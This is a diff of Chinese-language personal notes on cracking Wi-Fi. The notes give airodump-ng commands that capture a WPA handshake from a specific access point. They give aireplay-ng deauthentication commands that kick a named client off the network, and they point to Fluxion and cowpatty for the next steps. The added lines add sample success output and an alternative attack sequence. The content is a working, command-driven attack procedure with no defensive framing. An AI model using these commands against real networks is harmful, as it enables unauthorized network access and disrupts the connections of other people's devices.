@@ -16,13 +16,14 @@ airodump-ng wlan0  # 扫描 wifi
 # 只用此方式抓包较慢
 airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/handshake wlan0
 
-# CH 11 Elasped : 3 mins ... [WPA handshake -- 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
+# 第一行 CH  9 ][ Elapsed: 27 s ][ 2023-01-14 22:40 ][ WPA handshake: 34:36:54:D8:1F:A9 # 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
 ```
 
 ACK方式
 ```sh
-# 上面的不要关闭
+# 方式1 上面的不要关闭 执行下面
 aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0
+# 方式2 停止扫描， 执行攻击， 马上开启扫描。
 # -0: 通知设备断开连接 10: 攻击次数 -a:目标bssid -c: 目标踢下线的设备
 ```
 
@@ -37,6 +38,7 @@ https://github.com/FluxionNetwork/fluxion
 
 # 2.Handshake Snooper 检索WPA/WPA2加密散列。
 # 3.扫描所有信道 （2.4G和5G),  绿色是正在有人在连接且扫描到的。白色不确定是否有连接。
+# 选wifi，显示026直接输入26回车
 # 2.重置攻击
 # 2.aireplay-ng 解除认证方式
 # hash 验证方法: cowpatty
